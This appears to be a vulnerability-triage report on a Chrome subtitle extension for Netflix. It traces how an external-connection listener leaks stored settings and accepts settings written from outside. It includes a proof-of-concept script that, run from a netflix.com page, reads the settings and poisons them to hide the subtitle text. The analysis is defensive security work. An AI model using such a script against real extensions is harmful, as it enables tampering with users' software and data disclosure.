# CoCo Analysis: jepfhfjlkgobooomdgpcjikalfpcldmm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → bg_external_port_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jepfhfjlkgobooomdgpcjikalfpcldmm/opgen_generated_files/bg.js
Line 965: Minified code containing `chrome.storage.local.get(["settings"],(e=>{...}))` and `chrome.runtime.onConnectExternal.addListener`

**Code:**

```javascript
// Background script (bg.js) - minified but analyzed
// Entry point: chrome.runtime.onConnectExternal listener
chrome.runtime.onConnectExternal.addListener((s=>function(s){
    const i=s.sender&&s.sender.tab&&s.sender.tab.id;
    if(i){
        a[i]=s,
        console.log(`Connected: ${i} (tab)`),
        s.postMessage({settings:t}), // ← sends storage data to external connection
        s.onMessage.addListener((a=>{
            if(a.settings){
                // Process settings from external message
                let i=Object.assign({},t);
                i=Object.assign(i,a.settings), // ← attacker-controlled settings
                n(i)?t=i:(t=Object.assign({},e),s.postMessage({settings:t})),
                o(), // Saves to storage
                c()  // Broadcasts to all external connections
            }
        }))
    }
}(s)))

// Storage read on initialization
chrome.storage.local.get(["settings"],(e=>{
    console.log("Loaded: settings=",e.settings),
    e.settings&&n(e.settings)?t=e.settings:o() // ← storage data flows to t
}));

// Broadcast function
function c(){
    Object.keys(a).map((e=>a[e])).forEach((e=>{
        try{
            e.postMessage({settings:t}) // ← storage data sent to external connections
        }catch(e){
            console.error("Error: cannot dispatch settings,",e)
        }
    }))
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onConnectExternal

**Attack:**

```javascript
// From any webpage matching manifest.json externally_connectable pattern
// (https://www.netflix.com/*)
const port = chrome.runtime.connect("jepfhfjlkgobooomdgpcjikalfpcldmm");

// Receive stored settings (information disclosure)
port.onMessage.addListener((msg) => {
    console.log("Leaked settings:", msg.settings);
    // Settings include: primaryImageOpacity, primaryTextOpacity,
    // secondaryLanguageMode, secondaryLanguageLastUsed, etc.
});

// Attacker can also poison settings that get stored and broadcast to other tabs
port.postMessage({
    settings: {
        primaryImageOpacity: 0,  // Make primary image invisible
        primaryTextOpacity: 0,   // Make primary text invisible
        secondaryImageOpacity: 1,
        secondaryTextOpacity: 1
    }
});
```

**Impact:** Complete storage exploitation chain - Information disclosure of user settings via postMessage to external connections. The extension uses chrome.runtime.onConnectExternal which accepts connections from domains listed in manifest.json externally_connectable (https://www.netflix.com/*). An attacker controlling or compromising netflix.com can: (1) Read all stored settings via postMessage, (2) Poison storage by sending malicious settings that get stored and broadcast to all connected tabs, potentially disrupting the subtitle display functionality for all users.
